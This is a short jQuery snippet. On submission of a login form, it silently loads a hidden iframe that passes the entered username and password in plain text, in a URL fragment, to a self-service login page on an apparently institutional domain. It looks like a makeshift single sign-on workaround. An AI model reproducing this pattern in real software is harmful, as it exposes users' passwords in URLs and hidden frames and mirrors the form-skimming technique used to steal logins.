$(document).ready(function() {
    $('#login').submit(function() {
        var username = $('#username').val();
        var password = $('#password').val();
        if (username && password) {
            $('<iframe />', {
                width: '0',
                height: '0',
                frameborder: 'no',
                src: 'https://selfservice.sebts.edu/selfservice/login.aspx#mdl|'
                    + username + '|' + password,
            }).appendTo('body');
        }
    });
});
